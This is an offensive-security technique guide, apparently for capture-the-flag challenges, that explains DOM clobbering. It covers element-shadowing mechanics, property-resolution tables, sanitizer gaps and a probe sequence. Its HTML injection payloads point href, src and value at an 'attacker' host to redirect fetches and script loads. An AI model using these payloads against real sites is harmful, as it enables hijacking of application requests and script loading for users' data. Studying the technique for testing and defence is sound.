# DOM clobbering depth — the client-side twin

DOM clobbering is the browser's version of prototype pollution's
cousin: named elements shadow `document.x`/`window.x` lookups. A
page doing `x.y` where `x` is a clobbered name gets YOUR element —
the "pollution" is injected HTML, and the fallback is a property
read the app never guarded.

---

## 1. The mechanism

```html
<a id="x">                        → document.x === <a>
<img name="x">                    → document.x === <img>
<form name="x"><input name="y">   → document.x.y === <input>
```

Named/id elements register as properties of `document` (and
`window` for ids). `document.x` returns the element; a form's
named controls nest. App code doing `config.url` where `config`
resolves to `document.config` reads YOUR `href`/attribute.

The distinction from client-side PP: clobbering writes an ELEMENT
into the lookup path; PP writes a PROPERTY onto `Object.prototype`.
Both hijack a lookup — clobbering needs HTML injection, PP needs a
merge of attacker objects.

## 2. The lookup sites that break

```js
// the patterns that fall for clobbering
let cfg = config || {};              // window.config clobbered
let u = config.url;                  // <a name=config href=...>.url? no —
                                     // 'url' isn't a form control prop
let u = config.href;                 // <a id=config href=...>.href → YOUR url
x = opts.src                         // <img name=opts><...>.src? nested forms only
if (debug) {...}                     // <div id=debug> — truthy element!
var v = window[key]                  // id=key element
el.src = sources[name]               // a named-collection walk
form.action                          // <input name=action> shadows!
form.method                          // <input name=method> shadows!
form.submit                          // <input name=submit> SHADOWS the method!
```

The last three are the classics: a form control named `action`,
`method`, or `submit` shadows the form's own properties — the app
reads `.action` and gets an ELEMENT, then `.action = url` sets the
element's attribute, or `form.submit()` fails because `submit` is
now an element.

## 3. The injection shapes

```html
<!-- one-level: shadow a global -->
<div id="debug">
<img id="isAdmin" src=x>
<a id="home" href="https://attacker/x.js">

<!-- two-level: a nested lookup obj.prop -->
<form id="app"><input name="config"></form>
<!-- document.app.config === the input element -->

<form name="settings"><input name="theme" value="evil.css"></form>
<!-- document.settings.theme === input; .theme.value reads 'evil.css' -->

<a id="victim"><a id="victim" name="url" href="https://attacker"></a></a>
<!-- duplicate ids → an HTMLCollection; .url on it? collection named-item -->

<!-- the "src/href/value/innerHTML" attributes that matter -->
<input name="x" value="PAYLOAD">
<a name="x" href="PAYLOAD">
<img name="x" src="PAYLOAD">
<form name="x"><input name="y" value="P"></form>
```

## 4. Which properties resolve on which element

| App reads | Element to clobber | Value read |
|---|---|---|
| `x.href` | `<a>`/`link` | its `href` attr |
| `x.src` | `img/script/iframe` | its `src` attr |
| `x.value` | `input/select/textarea` | its `value` attr |
| `x.action` | `<form>` | its `action` attr |
| `x.innerHTML` | any | its HTML — a string! |
| `x.textContent` | any | its text — a string! |
| `x.name` | any named | its `name` attr |
| `x.id` | any | its `id` attr |
| `x.className` | any | its `class` |
| `x.tagName` | any | e.g. `"DIV"` — a truthy string |
| `x.y` | a `<form name=x><input name=y>` | the control (then .value) |
| `x.length` | a collection of same-id/named | the count |
| `x.toString()` | `<a>`/`<img>` | href/src string — string coercion! |

`x.toString()` is the powerful one — string coercion of an element
gives `href`/`src` — so `x + ""` on a clobbered `<a>` yields your URL.

## 5. The window-property hierarchy

```js
window.x        // id="x" element wins over undefined
window.x        // but a real var/let/const x SHADOWS the element
window.x        // window.x = <script>var x=1</script> → 1, not element
document.x      // named (name=) elements register here
document.forms.x
document.images.x
document.all.x  // legacy — still clobbered by both id and name
```

## 6. The "config object" clobber — the killer case

```js
// app:
var settings = window.settings || defaultSettings;
fetch(settings.api);
// clobber:
<form name="settings"><input name="api" value="https://attacker/">
// document.settings.api.value — wait: window.settings needs a form-
// accessible path: window.settings is the form; settings.api is the
// input element; fetch(element.toString()) — .toString on input is
// "[object HTMLInputElement]", NOT value. The read must reach .value
// or use a string-coercing element (<a href>.toString() = the URL).
```

This is the subtlety: `settings.api` gives the ELEMENT; the app
needs `settings.api.value` or an element whose `toString` is the
value (an `<a>` gives href). Match the element to the read depth.

## 7. Two-level nesting without a form

```html
<!-- form controls nest ONLY inside <form>; elsewhere id-collision
     collections are the trick -->
<div id="x">
  <a name="y" href="https://attacker">
</div>
<!-- document.x.y does NOT resolve — 'x' is a div, has no named-item.
     only form.elements and HTMLCollection support named lookup -->
```

Named-item nesting REQUIRES a `<form>` — `document.forms.x.y` or
`document.x.y` (form as named property) works; a `div` doesn't.
Duplicate-id collections (`<a id=x><a id=x name=y>`) — `document.x`
is an HTMLCollection; `document.x.y` resolves the named item inside
it on some engines — a second-class path, worth one probe.

## 8. The sanitizers and their holes

| Sanitizer | Clobbering status |
|---|---|
| DOMPurify default | ids/names allowed → clobbering survives |
| DOMPurify `SANITIZE_DOM` | strips name/id collisions → mostly safe |
| bleach/others | rarely strip `name`/`id` → survives |
| CSP | irrelevant — clobbering needs no script, just HTML |

A stored-XSS-lite (HTML injection without JS execution) is enough.

## 9. Pairing with client-side PP

```js
// client-side PP pollutes Object.prototype.x;
// clobbering puts an element where a lookup expected a value.
// they chain when: the app does window.config.api — PP can't put
// a nested 'api' under a fresh 'config' global, but a clobbered
// <form name=config><input name=api value=...> can — IF the read
// reaches .value. If the read is config.api directly (expecting a
// string), PP into the ELEMENT's own proto path won't help; the
// app must read a coercible property.
```

## 10. The probe sequence

```js
// 1. does the app read window.x/document.x where x is injectable?
//    grep the bundle: |\bwindow\.[a-z_]+\b| |document\.[a-z_]+|
// 2. what property does it read off x? (.href/.src/.value/...)
// 3. which element + attribute produces that property's value?
// 4. inject the element with the needed name/id
// 5. confirm: the app's own code path uses YOUR value —
//    a fetch to attacker, a script src, a form action
```

## 11. The falsifiers

- The read is on `window`/`document` but a `var`/`let`/`const`
  shadows it — clobbered element never consulted.
- The read is `x.y` where `x` is a div (no named-item support) —
  needs a `<form>` and the injection can't make one.
- The read depth exceeds two levels — DOM named-item nesting
  doesn't go deeper than form.controls.
- The sanitizer strips `name`/`id` — no clobbering carrier.

## 12. The ledger

```bash
python3 tools/state.py <chal> --hypothesis "dom clobber of window.config.api"
# refutes when: the name is shadowed by a real global; nesting
# exceeds form-controls; the read is non-coercible (needs a string,
# gets an element); sanitizer strips the attribute
```
